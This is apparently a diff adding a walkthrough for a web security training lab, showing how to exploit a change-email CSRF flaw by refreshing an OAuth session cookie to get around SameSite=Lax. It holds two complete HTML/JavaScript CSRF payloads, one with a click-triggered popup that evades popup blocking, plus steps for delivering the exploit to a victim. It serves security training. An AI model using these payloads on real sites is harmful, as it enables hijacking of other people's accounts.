@@ -1,0 +1,100 @@
+CSRF via OAuth Session Refresh – PoC Steps
+Lab Goal
+
+Exploit the change email functionality using CSRF by refreshing the victim’s OAuth session cookie and bypassing SameSite=Lax restrictions.
+
+Step 1 — Login via Social Media
+Open the lab.
+Click:
+Login with social media
+Complete OAuth authentication.
+Step 2 — Change Email Once
+Open:
+/my-account
+Change your email address.
+Step 3 — Observe Vulnerable Request
+Open Burp Suite.
+Go to:
+Proxy → HTTP history
+Find request:
+POST /my-account/change-email HTTP/2
+Observe:
+No CSRF token exists.
+Request depends only on session cookie.
+Step 4 — Observe OAuth Cookie Behavior
+In Burp history inspect:
+GET /oauth-callback?code=...
+Observe:
+Session cookie is issued.
+No explicit SameSite attribute set.
+Browser automatically applies:
+SameSite=Lax
+Step 5 — Understand the Vulnerability
+Newly issued cookies temporarily bypass Lax restrictions.
+Visiting:
+/social-login
+
+automatically refreshes the victim session cookie.
+
+Step 6 — Create Initial PoC
+Open Exploit Server.
+Paste:
+<form method="POST" action="https://0a17008b046492dd80862b7900f100e4.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="test123@evil.com">
+</form>
+
+<script>
+window.open('https://0a17008b046492dd80862b7900f100e4.web-security-academy.net/social-login');
+
+setTimeout(changeEmail, 5000);
+
+function changeEmail(){
+    document.forms[0].submit();
+}
+</script>
+Click Store.
+Click View exploit.
+Observe:
+Popup blocked by browser.
+Step 7 — Bypass Popup Blocker
+Modify exploit so popup opens only after user interaction.
+Final working payload:
+<form method="POST" action="https://0a17008b046492dd80862b7900f100e4.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="freshvictim2026@evil.com">
+</form>
+
+<h1>Click anywhere</h1>
+
+<script>
+window.onclick = () => {
+
+    window.open('https://0a17008b046492dd80862b7900f100e4.web-security-academy.net/social-login');
+
+    setTimeout(changeEmail, 5000);
+}
+
+function changeEmail() {
+    document.forms[0].submit();
+}
+</script>
+Step 8 — Test Exploit
+Click Store
+Click View exploit
+Click anywhere on page.
+OAuth popup opens.
+Wait 5 seconds.
+Email changes automatically.
+Step 9 — Verify CSRF Success
+Open:
+/my-account
+Confirm email address changed successfully.
+Step 10 — Deliver Final Exploit
+Change email to a NEW unused email.
+
+Example:
+
+finalsolve9981@evil.com
+Click Store again.
+Click:
+Deliver to victim
+Lab solved successfully.
